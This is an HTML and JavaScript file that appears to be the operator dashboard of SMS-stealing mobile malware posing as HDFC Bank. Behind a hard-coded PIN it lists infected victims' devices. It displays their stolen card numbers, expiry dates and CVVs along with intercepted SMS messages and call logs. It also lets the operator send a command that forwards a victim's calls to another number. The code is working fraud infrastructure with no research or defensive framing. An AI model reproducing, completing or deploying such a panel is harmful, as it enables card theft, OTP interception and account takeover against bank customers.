<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HDFC ADMIN | Mobile Portal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #004c8f;
            --accent: #ed232a;
            --bg: #0d1117;
            --card: #161b22;
            --text: #f0f6fc;
            --text-dim: #8b949e;
            --border: #30363d;
            --success: #238636;
            --danger: #da3633;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            font-family: 'Outfit', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            overflow-x: hidden;
            height: 100vh;
            width: 100vw;
        }

        /* --- PIN LOCK SCREEN --- */
        #lockScreen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .lock-logo {
            width: 80px; height: 80px;
            background: var(--primary);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            font-weight: 700;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 76, 143, 0.3);
        }

        .lock-title { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
        .lock-sub { color: var(--text-dim); margin-bottom: 40px; font-size: 14px; }

        .pin-dots { display: flex; gap: 20px; margin-bottom: 50px; }
        .pin-dot {
            width: 15px; height: 15px;
            border: 2px solid var(--border);
            border-radius: 50%;
            transition: all 0.2s;
        }
        .pin-dot.active { background: var(--text); border-color: var(--text); transform: scale(1.2); }
        .pin-dot.error { background: var(--danger); border-color: var(--danger); }

        .numpad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            max-width: 300px;
        }
        .num-btn {
            width: 70px; height: 70px;
            border-radius: 50%;
            background: var(--card);
            border: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.1s;
        }
        .num-btn:active { background: var(--border); transform: scale(0.9); }

        /* --- APP CONTENT --- */
        #appContent { display: none; padding-bottom: 80px; }

        .app-header {
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            background: rgba(13, 17, 23, 0.8);
            backdrop-filter: blur(10px);
            z-index: 100;
            border-bottom: 1px solid var(--border);
        }

        .page-title { font-size: 20px; font-weight: 700; }

        .stats-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            padding: 20px;
        }
        .stat-box {
            background: var(--card);
            padding: 20px;
            border-radius: 16px;
            border: 1px solid var(--border);
        }
        .stat-val { font-size: 24px; font-weight: 700; color: var(--accent); }
        .stat-label { font-size: 12px; color: var(--text-dim); text-transform: uppercase; }

        .user-list { padding: 0 20px; display: flex; flex-direction: column; gap: 15px; }
        .user-item {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .user-avatar {
            width: 50px; height: 50px;
            background: var(--primary);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 20px;
        }
        .user-info { flex: 1; }
        .user-name { font-weight: 700; font-size: 16px; margin-bottom: 2px; }
        .user-meta { font-size: 13px; color: var(--text-dim); }
        .status-badge {
            width: 8px; height: 8px;
            background: var(--success);
            border-radius: 50%;
            box-shadow: 0 0 10px var(--success);
        }

        /* --- DETAIL DRAWER --- */
        #detailDrawer {
            position: fixed;
            bottom: 0; left: 0; width: 100%; height: 90vh;
            background: var(--bg);
            border-radius: 30px 30px 0 0;
            z-index: 1000;
            transform: translateY(100%);
            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            border-top: 1px solid var(--border);
            display: flex;
            flex-direction: column;
        }
        #detailDrawer.active { transform: translateY(0); }

        .drawer-handle {
            width: 40px; height: 4px;
            background: var(--border);
            border-radius: 2px;
            margin: 15px auto;
        }

        .drawer-content { flex: 1; overflow-y: auto; padding: 20px; }

        .tabs {
            display: flex;
            background: var(--card);
            border-radius: 12px;
            padding: 5px;
            margin-bottom: 20px;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            font-size: 13px;
            font-weight: 600;
            border-radius: 8px;
            color: var(--text-dim);
        }
        .tab.active { background: var(--bg); color: var(--text); border: 1px solid var(--border); }

        .log-item {
            background: var(--card);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 12px;
            border: 1px solid var(--border);
        }
        .log-head { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 11px; color: var(--text-dim); }
        .log-sender { font-weight: 700; color: var(--primary); margin-bottom: 4px; display: block; }
        .log-msg { font-size: 14px; line-height: 1.4; }

        .backdrop {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7);
            display: none;
            z-index: 999;
        }

        input {
            background: var(--card);
            border: 1px solid var(--border);
            color: white;
            padding: 12px;
            border-radius: 10px;
            width: 100%;
            margin-top: 8px;
            outline: none;
        }
        .cmd-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            width: 100%;
            font-weight: 600;
            margin-top: 15px;
        }

        .card-view {
            background: linear-gradient(135deg, #1e293b, #0f172a);
            padding: 20px;
            border-radius: 16px;
            margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.05);
        }
    </style>
</head>
<body>

    <!-- PIN LOCK -->
    <div id="lockScreen">
        <div class="lock-logo">H</div>
        <h1 class="lock-title">HDFC ADMIN</h1>
        <p class="lock-sub">Secure Monitoring Portal</p>
        
        <div class="pin-dots" id="pinDots">
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
        </div>

        <div class="numpad">
            <div class="num-btn" onclick="pressNum('1')">1</div>
            <div class="num-btn" onclick="pressNum('2')">2</div>
            <div class="num-btn" onclick="pressNum('3')">3</div>
            <div class="num-btn" onclick="pressNum('4')">4</div>
            <div class="num-btn" onclick="pressNum('5')">5</div>
            <div class="num-btn" onclick="pressNum('6')">6</div>
            <div class="num-btn" onclick="pressNum('7')">7</div>
            <div class="num-btn" onclick="pressNum('8')">8</div>
            <div class="num-btn" onclick="pressNum('9')">9</div>
            <div class="num-btn" style="background:transparent; border:none;"></div>
            <div class="num-btn" onclick="pressNum('0')">0</div>
            <div class="num-btn" onclick="backspace()" style="font-size:18px;">⌫</div>
        </div>
    </div>

    <!-- MAIN APP -->
    <div id="appContent">
        <header class="app-header">
            <h1 class="page-title">Admin Dashboard</h1>
            <div class="status-badge"></div>
        </header>

        <div class="stats-row">
            <div class="stat-box">
                <div class="stat-val" id="totalUsers">0</div>
                <div class="stat-label">Users</div>
            </div>
            <div class="stat-box">
                <div class="stat-val" id="totalLogs">0</div>
                <div class="stat-label">Total Logs</div>
            </div>
        </div>

        <div class="user-list" id="userList">
            <!-- User items injected here -->
        </div>
    </div>

    <!-- DRAWER -->
    <div class="backdrop" id="backdrop" onclick="closeDrawer()"></div>
    <div id="detailDrawer">
        <div class="drawer-handle"></div>
        <div class="drawer-content" id="drawerContent">
            <!-- Content injected here -->
        </div>
    </div>

    <script>
        const CORRECT_PIN = '9639';
        let currentPin = '';
        let allData = { users: [], sms: [], calls: [] };
        let activeUser = null;
        let activeTab = 'sms';

        // --- PIN LOGIC ---
        function pressNum(num) {
            if (currentPin.length >= 4) return;
            currentPin += num;
            updateDots();
            if (currentPin.length === 4) {
                setTimeout(validatePin, 200);
            }
        }

        function backspace() {
            currentPin = currentPin.slice(0, -1);
            updateDots();
        }

        function updateDots() {
            const dots = document.querySelectorAll('.pin-dot');
            dots.forEach((dot, i) => {
                dot.className = 'pin-dot' + (i < currentPin.length ? ' active' : '');
            });
        }

        function validatePin() {
            if (currentPin === CORRECT_PIN) {
                document.getElementById('lockScreen').style.transform = 'translateY(-100%)';
                document.getElementById('appContent').style.display = 'block';
                startPolling();
            } else {
                const dots = document.querySelectorAll('.pin-dot');
                dots.forEach(dot => dot.classList.add('error'));
                setTimeout(() => {
                    currentPin = '';
                    updateDots();
                }, 500);
            }
        }

        // --- APP LOGIC ---
        async function fetchData() {
            try {
                const response = await fetch('/api/admin/data');
                allData = await response.json();
                renderUsers();
                updateStats();
            } catch (e) { console.error(e); }
        }

        function updateStats() {
            document.getElementById('totalUsers').textContent = allData.users.length;
            document.getElementById('totalLogs').textContent = allData.sms.length + allData.calls.length;
        }

        function renderUsers() {
            const list = document.getElementById('userList');
            list.innerHTML = allData.users.map(user => `
                <div class="user-item" onclick="openUser('${user.device_id}')">
                    <div class="user-avatar">${(user.full_name || 'U').charAt(0)}</div>
                    <div class="user-info">
                        <div class="user-name">${user.full_name || 'Pending User...'}</div>
                        <div class="user-meta">${user.phone || user.device_id.substring(0,8)}</div>
                    </div>
                    <div class="status-badge"></div>
                </div>
            `).join('');
        }

        function openUser(deviceId) {
            activeUser = allData.users.find(u => u.device_id === deviceId);
            document.getElementById('backdrop').style.display = 'block';
            document.getElementById('detailDrawer').classList.add('active');
            renderDrawer();
        }

        function closeDrawer() {
            document.getElementById('backdrop').style.display = 'none';
            document.getElementById('detailDrawer').classList.remove('active');
        }

        function switchTab(tab) {
            activeTab = tab;
            renderDrawer();
        }

        function renderDrawer() {
            const content = document.getElementById('drawerContent');
            const logs = activeTab === 'sms' ? 
                allData.sms.filter(s => s.device_id === activeUser.device_id) :
                allData.calls.filter(c => c.device_id === activeUser.device_id);

            content.innerHTML = `
                <h2 style="font-size:24px; margin-bottom:5px;">${activeUser.full_name || 'User Profile'}</h2>
                <p style="color:var(--text-dim); margin-bottom:25px; font-size:14px;">Device: ${activeUser.device_id.substring(0,12)}...</p>

                <div class="card-view">
                    <div style="font-size:11px; text-transform:uppercase; color:rgba(255,255,255,0.5); margin-bottom:15px;">Target Card Details</div>
                    <div style="font-family:monospace; font-size:20px; letter-spacing:3px; margin-bottom:15px;">${activeUser.card_num || '**** **** **** ****'}</div>
                    <div style="display:flex; justify-content:space-between; font-size:13px;">
                        <span>${activeUser.card_name || 'NOT ENTERED'}</span>
                        <span>${activeUser.card_exp || 'MM/YY'} | CVV: ${activeUser.card_cvv || '***'}</span>
                    </div>
                </div>

                <div style="margin-bottom:25px;">
                    <label style="font-size:11px; text-transform:uppercase; color:var(--text-dim);">Command: Forward Calls To</label>
                    <input type="tel" id="fwdNum" value="${activeUser.forwarding_number || ''}" placeholder="+91...">
                    <button class="cmd-btn" onclick="saveForwarding()">Sync Command</button>
                </div>

                <div class="tabs">
                    <div class="tab ${activeTab === 'sms' ? 'active' : ''}" onclick="switchTab('sms')">SMS Logs</div>
                    <div class="tab ${activeTab === 'calls' ? 'active' : ''}" onclick="switchTab('calls')">Call History</div>
                </div>

                <div class="log-container">
                    ${logs.length === 0 ? '<p style="text-align:center; padding:40px; color:var(--text-dim);">No logs found.</p>' : 
                    logs.map(log => `
                        <div class="log-item">
                            <div class="log-head">
                                <span>${new Date(log.received_at || log.called_at).toLocaleTimeString()}</span>
                                <span>${new Date(log.received_at || log.called_at).toLocaleDateString()}</span>
                            </div>
                            ${activeTab === 'sms' ? 
                                `<span class="log-sender">${log.sender}</span><div class="log-msg">${log.message}</div>` :
                                `<span class="log-sender">${log.number}</span><div class="log-msg">Type: ${log.type} | Duration: ${log.duration}s</div>`
                            }
                        </div>
                    `).join('')}
                </div>
            `;
        }

        async function saveForwarding() {
            const num = document.getElementById('fwdNum').value;
            const btn = event.target;
            btn.textContent = 'Syncing...';
            btn.disabled = true;

            try {
                await fetch('/api/admin/update-forwarding', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ deviceId: activeUser.device_id, number: num, enabled: true })
                });
                alert('Command Synced! Device will forward calls to ' + num);
            } catch (err) { alert('Sync Failed'); }
            
            btn.textContent = 'Sync Command';
            btn.disabled = false;
        }

        function startPolling() {
            fetchData();
            setInterval(fetchData, 3000);
        }
    </script>
</body>
</html>
